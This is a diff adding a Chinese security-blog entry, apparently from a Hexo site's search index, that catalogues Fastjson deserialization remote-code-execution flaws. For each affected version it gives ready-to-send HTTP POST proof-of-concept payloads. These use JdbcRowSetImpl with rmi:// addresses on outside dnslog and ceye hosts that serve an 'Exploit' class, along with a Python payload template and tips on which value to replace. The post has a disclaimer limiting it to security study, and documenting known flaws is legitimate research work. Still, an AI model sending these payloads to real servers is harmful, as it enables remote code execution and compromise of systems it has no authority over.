@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>fastjson漏洞历史&amp;poc</title>
+      <link href="/2020/12/20/fastjson-lou-dong-li-shi-poc/"/>
+      <url>/2020/12/20/fastjson-lou-dong-li-shi-poc/</url>
+      
+        <content type="html"><![CDATA[<p>参考资料</p><blockquote><p><a href="https://www.ascotbe.com/1899/11/30/Cms/Fastjson/" target="_blank" rel="noopener">fastjson poc</a></p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h4 id="0x01-Fastjson-lt-1-2-24反序列化远程代码执行漏洞"><a href="#0x01-Fastjson-lt-1-2-24反序列化远程代码执行漏洞" class="headerlink" title="0x01 Fastjson<=1.2.24反序列化远程代码执行漏洞"></a>0x01 Fastjson&lt;=1.2.24反序列化远程代码执行漏洞</h4><ul><li><p>披露时间</p><pre><code>  2017-3-15</code></pre></li><li><p><code>CVE</code>编号</p><pre><code>  无</code></pre></li><li><p>影响版本</p><pre><code>  Fastjson&lt;=1.2.24</code></pre></li><li><p>漏洞分析</p><pre><code>  fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数</code></pre></li></ul><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式:"></a>请求方式:</h5><pre><code>POST</code></pre><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><p>直接发送数据包即可</p><p>  <a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/1.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/1.png?raw=true" alt="image-20200220165248326"></a></p><pre><code>  POST / HTTP/1.1  Host: you_ip  Accept-Encoding: gzip, deflate  Accept: */*  Accept-Language: en  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  Connection: close  Content-Type: application/json  Content-Length: 170  {      "b":{          "@type":"com.sun.rowset.JdbcRowSetImpl",          "dataSourceName":"rmi://222.dob132.dnslog.cn//Exploit",          "autoCommit":true      }  }</code></pre></li><li><p>注意<code>rmi://XXXX//Exploit</code>这段到代码只需要替换<code>xxxx</code>的值即可</p><p>  <a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/2.png?raw=true" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/2.png?raw=true" alt="image-20200220165312932"></a></p></li></ul><h4 id="0x02-Fastjson-1-2-47-远程命令执行漏洞"><a href="#0x02-Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="0x02 Fastjson 1.2.47 远程命令执行漏洞"></a>0x02 Fastjson 1.2.47 远程命令执行漏洞</h4><ul><li><p>披露时间</p><pre><code>  2019-7-15</code></pre></li><li><p><code>CVE</code>编号</p><pre><code>  无</code></pre></li><li><p>影响版本</p><pre><code>  Fastjson&lt;=1.2.47</code></pre></li><li><p>漏洞分析</p><pre><code>  fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</code></pre></li></ul><h5 id="请求方式-1"><a href="#请求方式-1" class="headerlink" title="请求方式:"></a>请求方式:</h5><pre><code>POST</code></pre><h5 id="POC-1"><a href="#POC-1" class="headerlink" title="POC:"></a>POC:</h5><ul><li><p>直接发送数据包即可</p><p>  <a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/3.png?raw=true" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/3.png?raw=true" alt="image-20200220170302444"></a></p><pre><code>  POST / HTTP/1.1  Host: you_ip  Accept-Encoding: gzip, deflate  Accept: */*  Accept-Language: en  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  Connection: close  Content-Type: application/json  Content-Length: 268  {      "a":{          "@type":"java.lang.Class",          "val":"com.sun.rowset.JdbcRowSetImpl"      },      "b":{          "@type":"com.sun.rowset.JdbcRowSetImpl",          "dataSourceName":"rmi://123.dd.evhyf5.dnslog.cn/Exploit",          "autoCommit":true      }  }</code></pre></li><li><p>注意<code>rmi://XXXX//Exploit</code>这段到代码只需要替换<code>xxxx</code>的值即可</p><p>  <a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/4.png?raw=true" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/4.png?raw=true" alt="image-20200220170351359"></a></p></li></ul><p>Fastjson 1.2.51</p><pre><code> payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%s.xw2kit.ceye.io:1066/Exploit\",\"autoCommit\":true}}}" %(url)</code></pre><p>Fastjson 1.2.61</p><pre><code>https://github.com/jas502n/fastjson-1.2.61-RCE</code></pre><p>Fastjson 1.2.62</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulhub </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> javasec </tag>
+            
+            <tag> poc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>环境配置</title>
       <link href="/2020/12/04/huan-jing-pei-zhi/"/>
       <url>/2020/12/04/huan-jing-pei-zhi/</url>
